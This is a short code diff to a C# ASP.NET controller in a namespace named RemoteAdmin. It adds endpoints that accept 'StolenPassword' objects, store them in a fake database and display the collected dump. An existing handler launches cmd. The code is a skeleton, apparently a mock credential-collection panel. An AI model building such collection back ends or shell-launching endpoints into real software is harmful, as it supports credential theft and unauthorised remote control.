@@ -16,7 +16,7 @@ namespace RemoteAdmin.Controllers
         [HttpGet]
         public ViewResult Index()
         {
-            return View(new string[] {"c#", "java", "null"});
+            return View("Index");
         }
 
         [HttpPost]
@@ -32,6 +32,20 @@ namespace RemoteAdmin.Controllers
             Process.Start("cmd");
             return View("Privacy");
         }
-       
+
+        [HttpGet]
+        public ViewResult Passwords()
+        {
+            return View("Passwords");
+        }
+
+        [HttpPost]
+        public ViewResult Passwords(StolenPassword pass)
+        {
+            FakeDataBase.AddPassword(pass);
+            FakeDataBase.GetDump(pass);
+            return View("ShowPassword", FakeDataBase.GetPasswords);
+        }
+
     }
 }
